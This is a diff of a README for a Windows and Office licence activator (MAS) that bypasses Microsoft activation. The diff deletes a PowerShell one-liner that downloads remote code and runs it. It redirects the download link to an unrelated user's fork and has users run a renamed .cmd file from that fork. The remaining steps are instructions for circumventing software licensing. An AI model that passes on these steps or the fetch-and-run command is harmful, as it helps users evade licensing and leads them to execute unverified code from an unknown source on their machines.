@@ -1,27 +1,17 @@
-## Microsoft  Activation  Scripts (MAS):
+## Microsoft  Activator  in  folder (MAS):
 
 A Windows and Office activator using HWID / KMS38 / Online KMS activation methods, with a focus on open-source code and fewer antivirus detections.
 
 ## Download / How to use it?
 
-### Method 1 - PowerShell (Recommended)
+### Method Traditional
 
--   On Windows 8.1/10/11, right-click on the windows start menu and select PowerShell or Terminal (Not CMD).
--   Copy-paste the below code and press enter\
-    `irm https://massgrave.dev/get | iex`
--   You will see the activation options, and follow onscreen instructions.
--   That's all.
-
-### Method 2 - Traditional
-
--   Download the file from [here](https://github.com/massgravel/Microsoft-Activation-Scripts/archive/refs/heads/master.zip)
+-   Download the file from [here](https://github.com/Hicham94460/activateur-windows-8-10-11/archive/refs/heads/main.zip)
 -   Right click on the downloaded zip file and extract
--   In the extracted folder, find the folder named `All-In-One-Version`
--   Run the file named `MAS_AIO.cmd`
+-   In the extracted folder, find the folder named `MAS`
+-   Run the file named `Microsoft-Activator.cmd`
 -   You will see the activation options, and follow onscreen instructions.
 -   That's all.
-
-To run the scripts in unattended mode, check [here](https://massgrave.dev/command_line_switches.html)
 
 ```
 Latest Version: 1.8
